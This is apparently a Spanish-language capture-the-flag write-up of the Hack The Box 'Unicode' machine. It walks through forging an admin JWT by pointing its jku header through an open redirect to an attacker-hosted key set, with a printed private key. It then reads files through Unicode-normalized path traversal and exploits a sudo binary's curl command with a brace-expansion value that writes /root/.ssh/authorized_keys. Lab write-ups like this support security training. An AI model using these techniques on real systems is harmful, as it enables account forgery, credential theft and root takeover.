![](assets/2022-07-02-09-58-31.png)

* #Author: José Luis Íñigo
* #Nickname: Riskoo
* #Machine Unicode Hack the box
* #Skills: JWT Enumeration JWT - Claim Misuse Vulnerability JSON Web Key Generator (Playing with mkjwk) Forge JWT Open Redirect Vulnerability Creating a JWT for the admin user LFI (Local File Inclusion) - Unicode Normalization Vulnerability Abusing Sudoers Privilege Playing with pyinstxtractor and pycdc Bypassing badchars and creating a new passwd archive (Privilege Escalation)
* eWPT eWPTXv2 OSWE

Mi ip --> 10.10.14.9
Máquina víctima --> 10.10.11.126

# Mapeo

## ¿Estamos conectados?

```bash
ping 10.10.11.126
PING 10.10.11.126 (10.10.11.126) 56(84) bytes of data.
64 bytes from 10.10.11.126: icmp_seq=1 ttl=63 time=47.5 ms
```
## ¿Tipo de máquina?
Linux


## Exploración de puertos abiertos
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.126 -oG allports
[sudo] contraseña para riskoo: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 10:04 CEST
Initiating SYN Stealth Scan at 10:04
Scanning 10.10.11.126 [65535 ports]
Discovered open port 22/tcp on 10.10.11.126
Discovered open port 80/tcp on 10.10.11.126
Completed SYN Stealth Scan at 10:05, 12.86s elapsed (65535 total ports)
Nmap scan report for 10.10.11.126
Host is up, received user-set (0.048s latency).
Scanned at 2022-07-02 10:04:56 CEST for 13s
Not shown: 65361 closed tcp ports (reset), 172 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
Puertos abiertos 22 y 80. Los servicios que corren son ssh y web

## Directorios con f

```bash
feroxbuster -u http://10.10.11.126

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.126
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
WLD      GET      515l      959w     9294c Got 200 for http://10.10.11.126/4f268c8a4da745d5aeb4f546167095cb (url length: 32)
WLD      GET         -         -         - Wildcard response is static; auto-filtering 9294 responses; toggle this behavior by using --dont-filter
308      GET        4l       24w      262c http://10.10.11.126/display => http://10.10.11.126/display/
308      GET        4l       24w      262c http://10.10.11.126/pricing => http://10.10.11.126/pricing/
```

## Whatweb
```bash
whatweb 10.10.11.126
http://10.10.11.126 [503 Service Unavailable] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.126], Script, Title[503], nginx[1.18.0]
```
## Bupsuite

Vamos a navegar con el historial limpio . Hay que recordar que el jwt editor está instalado y veremos si tiene algo.

## Que hay en la web interesante

1. He recorrido toda la web/ esto siguiente no son las urls sino enumeracion
   1. login
   2. registro
   3. chekout
   4. comprar
   5. upload pdf

2. He entonctrado a simple vista 
   1. upload pdf
```html
<html>
	<head>
		<title>Upload</title>
    <body>
        <form action="" method="POST"  enctype="multipart/form-data">
            <input type="file" name="threat_report" accept=".pdf" accept=".doc" placeholder="Upload a threat report" >
            <input type="submit" value="submit">
        </form>
    </body>
</html>


```
   2. Arrastra una cookie con jwt
   ![](assets/2022-07-02-10-18-00.png)
   ![](assets/2022-07-02-10-18-31.png)
   
   3. Aunque los links aparte de los mencionados no llevan a nada , he encontrado que la web se llama  Hackmedia y que luego tiene un enlace a twitter y bootstrap... en principio no es interesante pero si nos bloqueamos a lo mejor mdo o hackmedia podemos intentar usarlo como vhost
 
   4. Vemos un redirect en google about
    ```html
    <p class="lead">
      <a href="/redirect/?url=google.com" class="btn btn-lg btn-secondary fw-bold border-white bg-white">Google about us</a>
    </p>
    ```

## Analizamos el jwt

![](assets/2022-07-02-10-21-38.png)

Es interesante porque usa el jku en jwks.json

Los conjuntos de JWK como este a veces se exponen públicamente a través de un punto final estandar como /.well-known /jwks.json

en /static/jwk.json aparece el siguiente json

```json
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs",
            "e": "AQAB"
        }
    ]
}
```

## Añadimos a vhost hackmedia
```bash
echo "10.10.11.126 hackmedia.htb" | sudo tee -a /etc/hosts
```

#### jwks inyection modo 2
Los jwks son tokens los cuales la firma va en una url .
> estas urls normalmente no dejan usar otro dominio y tienen una limpieza de url por lo que a lo mejor tenemos que usar una base /lalala/jwks.json y nosotros volveríamos atrás con /lalala/../jwks.json

La idea es por una parte crearnos un jwks válido y ponerlo en nuestro pc, luego que pille nuestra url de alguna forma normalmente es posible encontrar un ?redirect

Podemos usar tres opciones:
   -burpsuite

   -jw_tools

   -mkjwk.org > En esta una vez sabemos el jwks pondremos los valores y nos creará una clave pública y una privada.
   en jwt.io pondremos esa clave publica y privada, modificaremos la url de donde acepta y modificamos en nuestro servidor el valor de jwks.json por el que nos da el programa. Con esto tendremos un jwks válido para nuestras claves. Y podremos modificar el valor nombre, role etc.

![](assets/2022-07-02-12-25-54.png)

Ahora nos genera una clave privada y una pública x.509

-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiZ+ttg8XdEZkg97vGWsd
cuBxOmGfOetXkdedxsP142f4A0AYaP8FtafRX8FduSLQ/c3PTNmw+kkU9BlUDqdS
QPpeI2/d5MfO4FYj3xrrz20wgZ6pOJVe5yWXrBXCdKhgc9jwH3T1CvlDHqhZWmcn
ixsURRx9rJ2Ew5rWK1+kFCTsTCa6VMwFRmkFwydb5C2r2sV+dAlA47akUKdfCzZz
U74JQWahkA/gy1i5dlEfwEV/4DTh8ICaR0374l/n1OEt4Q+v6vWfFv9Tt2dhT4B1
kjERV9Fp6T1z3kzO6Sr7UxtxHFMwnOlkAIbvOnB8u3XSfy/Vif4SKvxjxuX1KQwq
swIDAQAB
-----END PUBLIC KEY-----

-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCJn622Dxd0RmSD
3u8Zax1y4HE6YZ8561eR153Gw/XjZ/gDQBho/wW1p9FfwV25ItD9zc9M2bD6SRT0
GVQOp1JA+l4jb93kx87gViPfGuvPbTCBnqk4lV7nJZesFcJ0qGBz2PAfdPUK+UMe
qFlaZyeLGxRFHH2snYTDmtYrX6QUJOxMJrpUzAVGaQXDJ1vkLavaxX50CUDjtqRQ
p18LNnNTvglBZqGQD+DLWLl2UR/ARX/gNOHwgJpHTfviX+fU4S3hD6/q9Z8W/1O3
Z2FPgHWSMRFX0WnpPXPeTM7pKvtTG3EcUzCc6WQAhu86cHy7ddJ/L9WJ/hIq/GPG
5fUpDCqzAgMBAAECggEAd9zJ17HnNI8GhlAJILNJL79I/pb9rd1KJKyNLwuHQetQ
d8xANlo+p8sksOhh75fiO9sffIhw+lviUwMoUabrHcqxaN3KfbKEfKCpl2wEC2HH
CG2eZri5sknsgqVk+mOXte4wnMUpksgr7CylvfXv29jW26aH0mpSsmZNt/MRnbSP
u7IJjeBTJGzBKZTyxqYhDjCE59lK9OY+eGWyE5bio0jrNJ5LiMYvIT14HAmJ6mYK
cZDtChRWOFPpxJsHlkxQcWsdhAXdMghKWMfPEskWbej5adFNkglr7cELVHQ7hGon
sNqTFYgLdPYVfCvc+HFxA3kU6vlQkfkVG76PVqbmwQKBgQDBT8MvngnZAbv0FjVL
3OMlKITi50lTpyDFAi60imF4mMCK3BL1fc7q8HxpwUiWDvAO48D4nl9wUlzhIhh2
VEJqubn8MnGcAwDxDrdn7i80/RkMidL59Irhk910Lz4mrPh1Kw7YLBu7RwsXoOdM
Rhs5LEDWIOozmvfsJ5x/e86M0wKBgQC2QNqDv8Ks11q2blRuR0CWtNQkQ8g726nW
gQoDoM0hLyUhTEoNFhb2kO5zoBcFKlXIbX3KB2O+GAFKXJUopqGOwacOU4whAKgY
ttdl5ryfXBQbPDJHIJQ1RC7YmbKiHjA9ypZITZdIaKzEZfTqBj/Uj/g9U2etqUPg
QiFYaTu+oQKBgHqTbRzAhVYI93kqq9jS02U4cCrApYpZqznAzITGSlAB6/Ug3xSz
FYV7wCf+21vrVOTcHfyHz9SVJTfMOt6tRwANjJUSF1/pt6sivcE1EtHyuvNsYU8F
dRrce8u0OSClBVamWt9P+LWjsrDk4kVHHvP9z473iAn49cPUyjM7+hjpAoGAECYY
9pmUN1pxqD6IbqkTmQb20SvMXzlsiBww9fdWlb0mrhejbBtr93cKGeayg3un1DWX
csJK3TolSyB++vYg1JRmKAfRH89+FYqF9XqHdhtjkLI5xkGlwD6FZB3iTSkdnywH
OurdH8ZeoJxkIiRhnYUQOubcBfA8mm9howLYD2ECgYBrnk5qZfqkAdREqPcyKF6k
AatisAPl9iZNbIZwx5ASTfCFwD8XPOIj3htrLmM660tWS2/CTPbOMCDQ7V+p4wG2
/UKqeg+L1JddEQlCrJ967+VzIh305FSVT/jQ4OeUINastlzXcMlzc+ARg0A2uIw+
t5ykYCSF6x5ekgVg9vMJKw==
-----END PRIVATE KEY-----

Vamos jwt.io según el paso de antes ya tenemos el jwt puesto y podemos ver la distribución

![](assets/2022-07-02-12-54-03.png)

Hemos modificado el jku
y el user que le hemos puesto admin (totalmente random, podría ser administrator u otro)
Luego hemos pegado nuestra public y private key y nos genera un jwt. Vale ese jwt lo validará con la url que hemos puesto por lo que tendríamos que descargarnos el http://hackmedia.htbw/static/jwks.json lo modificamos con el valor de **n** que tenemos de la página mkjwk.org y entonces ya al forzar el redirect que vimos que había en la web iría a nuestro servidor , miraría el jwks que es válido para nuestras claves públicas creadas y puestas por lo que el jwt debería de valer.

Nuestro jwt sería ahora 

```son
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRidy9zdGF0aWMvLi4vcmVkaXJlY3Q_aHR0cDovLzEwLjEwLjE0Ljkvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.CJfngE_MKIqtsLhMET0URcA-gDFZ4QsDJYxbldbPX-YxdFJtWF4p_0fy1vTTemivGcnN-9y4UOwiwXJNg4OTcYhbliSC0fyLBvgOb-UKfdD-Vbm3G8QeZWWZEz6j7gG_Hm31KW5idmFVQUlymlPGBePX404EsjJtCWGfhXvgjZWIphpqLWQorEcd16AtolGQxCmH2z_vyR73X8aTD1W97xC8up_Ir0Pvd8CAuHh6VpgRYRifOE0oKu1H1oIWB9u6kAXnmQw2xq1KAKXNCBbgNdJpqNSGdD3bE6d5bcX9QTvN_LAJTXyt_rmV30p9GRBUjEcj9921iWqvCwXFr_DdMw
```

wget hackmedia.htb/static/jwks.json

![](assets/2022-07-02-12-42-33.png)

Cambiamos el valor de n por el de la página mkjwk.org y montamos un servidor con python3 -m http.server 80


Ahora solo faltaría cambiar la cookie y listo, ya estamos dentro del admin.

## Dentro del admin

Analizando lo interesante aquí , porque mucho no se puede hacer es que tiene un enlace en current y last quarter que llama /display/?page= algo...en pdf

Progamos directamente un traversal path. El típico es /etc/passwd . Podría limpiarnos la codificación y deberímos de probar otras formas de poner los ../

http://hackmedia.htb/display/?page=‥/‥/‥/‥/‥/‥/‥/etc/passwd


![](assets/2022-07-02-20-05-42.png)

Vimos anteriormente que era un ngix. Ahora que podemos leer podemos ir directamente a los archivos interesantes. Según google en ngix

By default on Debian systems, Nginx server blocks configuration files are stored in /etc/nginx/sites-available directory, which are enabled through symbolic links to the /etc/nginx/sites-enabled/ directory. You can name the configuration file as you like but usually it is best to use the domain name

http://hackmedia.htb/display/?page=‥/‥/‥/‥/‥/‥/‥/etc/nginx/sites-enabled/default

![](assets/2022-07-02-20-08-34.png)

Vemos que en db.yaml hay una password

![](assets/2022-07-03-11-03-49.png)

```bash
#Aparece un location así que probamos con las diferentes 
http://hackmedia.htb/display/?page=‥/‥/‥/‥/‥/‥/‥/home/code/db.yaml
http://hackmedia.htb/display/?page=‥/‥/‥/‥/‥/‥/‥/home/code/coder/db.yaml

#Listo, ya aparece un código


mysql_host: "localhost"
mysql_user: "code"
mysql_password: "B3stC0d3r2021@@!"
mysql_db: "user"
```
Probamos con ssh

![](assets/2022-07-03-11-22-32.png)

```bash
cat user.txt
```
## Una vez dentro como usuario

Lo primero como siempre un sudo -l

```bash
code@code:~$ sudo -l
Matching Defaults entries for code on code:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User code may run the following commands on code:
    (root) NOPASSWD: /usr/bin/treport

```

Ejecutamos como sudo el treport
![](assets/2022-07-03-11-32-33.png)

Intentamos trastear , hay una opción de download pero bueno sin el código poco vamos a hacer después de hacer varias pruebas.

le hacemos un cat a trereport y vemos que es ilegible es un binario por lo que vamos pasarnoslos a nuestro pc e intentar decompilarlo

Copiamos trereport a home/code y hacemos un python3 -m http.server 443 , en este caso no nos deja ese puerto, seguramente tenga algo corriendo ahí, así que pongo uno random , el 1111

Nos descargamos con wget http://ip/1111/treport el archivo

Ahora tenemos un binario ... a ver como lo decompilamos. Hago un strings y grep con py para ver si veo alguna librería algo interesante para buscar en google como se hace esto.

strings treport | grep -i py

Lo primero interesante así que veo es _pyi_main_co

Encuentro esto https://github.com/extremecoders-re/pyinstxtractor , voy a ver si instalándolo puedo decompilarlo , treport es un ejecutable...

PyInstaller Extractor is a Python script to extract the contents of a PyInstaller generated Windows executable file. The contents of the pyz file (usually pyc files) present inside the executable are also extracted.

```bash
python pyinstxtractor.py ../../evidences/treport
[+] Processing ../../evidences/treport
[+] Pyinstaller version: 2.1+
[+] Python version: 3.8
[+] Length of package: 6798297 bytes
[+] Found 46 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: treport.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.8 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: ../../evidences/treport

You can now use a python decompiler on the pyc files within the extracted directory
❯ ls
 treport_extracted   LICENSE   pyinstxtractor.py   README.md
❯ cd treport_extracted
❯ ls
 lib-dynload            libcrypto.so.1.1   libmpdec.so.2         libtinfo.so.6                 pyi_rth_pkgutil.pyc       pyimod03_importers.pyc   treport.pyc
 PYZ-00.pyz_extracted   libexpat.so.1      libpython3.8.so.1.0   libz.so.1                     pyiboot01_bootstrap.pyc   pyimod04_ctypes.pyc     
 base_library.zip       libffi.so.7        libreadline.so.8      pyi_rth_inspect.pyc           pyimod01_os_path.pyc      PYZ-00.pyz              
 libbz2.so.1.0          liblzma.so.5       libssl.so.1.1         pyi_rth_multiprocessing.pyc   pyimod02_archive.pyc      struct.pyc  

```

En la misma documentación dice que después de obtener el binario podemos usar otro programa para ver el código en py

```bash
After extracting the pyc's you can use a Python decompiler like Uncompyle6.

X:\> uncompyle6.exe test.exe_extracted\test.pyc
X:\> uncompyle6.exe test.exe_extracted\PYZ-00.pyz_extracted\__future__.pyc
```

En vez de clonarme el repositorio he visto que puedo instalarlo con pip
```bash
pip install uncompyle6
```

Para usarlo pone 
```bash
uncompyle6 *compiled-python-file-pyc-or-pyo*
```
Encontramos un treport.pyc dentro de la carpeta descomprimida

He instalado uncompyle6 y me sale el siguiente fallo por la versión actual de python..., así que voy a usar otra aplicacion. Creo recordar que hay un gcpython...
```
python versions 3.9 and greater are not supported.
Traceback (most recent call last):
  File "/usr/local/bin/uncompyle6", line 5, in <module>
    from uncompyle6.bin.uncompile import main_bin
  File "/home/riskoo/.local/lib/python3.10/site-packages/uncompyle6/__init__.py", line 54, in <module>
    from uncompyle6.main import decompile_file
  File "/home//.local/lib/python3.10/site-packages/uncompyle6/main.py", line 19, in <module>
    from uncompyle6 import verify
```
Probamos con pycdc https://github.com/zrax/pycdc

Nos lo clonamos y hacemos un cmake Cmakelist.txt y luego make para compilarlo y que nos aparezca el ejecutable  

![](assets/2022-07-03-12-36-47.png)

Ya tenemos el pycdc y ahora lo ejecutamos 

./pycdc ../pyinstxtractor/treport_extracted/treport.pyc    

```python
# Source Generated with Decompyle++
# File: treport.pyc (Python 3.10)

Unsupported opcode: <255>
import os
import sys
from datetime import datetime
import re

class threat_report:
    
    def create(self):
Unsupported opcode: <255>
        file_name = input('Enter the filename:')
        content = input('Enter the report:')
    # WARNING: Decompyle incomplete

    
    def list_files(self):
        file_list = os.listdir('/root/reports/')
        files_in_dir = ' '.join((lambda .0: [ str(elem) for elem in .0 ])(file_list))
        print('ALL THE THREAT REPORTS:')
        print(files_in_dir)

    
    def read_file(self):
Unsupported opcode: <255>
        file_name = input('\nEnter the filename:')
    # WARNING: Decompyle incomplete

    
    def download(self):
Warning: block stack is not empty!
        now = datetime.now()
        current_time = now.strftime('%H_%M_%S')
        command_injection_list = [
            '$',
            '`',
            ';',
            '&',
            '|',
            '||',
            '>',
            '<',
            '?',
            "'",
            '@',
            '#',
            '$',
            '%',
            '^',
            '(',
            ')']
        ip = input('Enter the IP/file_name:')
        res = bool(re.search('\\s', ip))
        if res:
            print('INVALID IP')
            sys.exit(0)
            if 'file' in ip and 'gopher' in ip or 'mysql' in ip:
                print('INVALID URL')
                sys.exit(0)
                for vars in command_injection_list:
                    print('NOT ALLOWED')
                    sys.exit(0)
                cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '"'
                os.system(cmd)
                return None
```

De aquí lo primero que podemos ver es que está bloqueando ciertos caracteres y luego que ejecuta un curl de una ip desde una bash.

Se me ocurre según hemos visto otras veces que al las llaves no estar bloqueadas, podríamos poner {unarchivo desde una ip,-o,meter el archivo de salida en root uathorized keys} lo que pasa que no se si code tiene una key por lo que tendría que crearla.

En principio creo recordar que al tener python puedo hacer esto desde la terminal de code. Como vamos a tener que crear un http.server y ejecutar además el treport nos tenemos que abrir otro ssh 

ssh-keygen desde /home/code y nos crea una id_rsa



{http://10.10.11.126:1111/id_rsa,-o,/root/.ssh/authorized_keys}

{10.10.11.126:1111/id_rsa.pub,-o,/root/.ssh/authorized_keys}

![](assets/2022-07-03-13-21-09.png)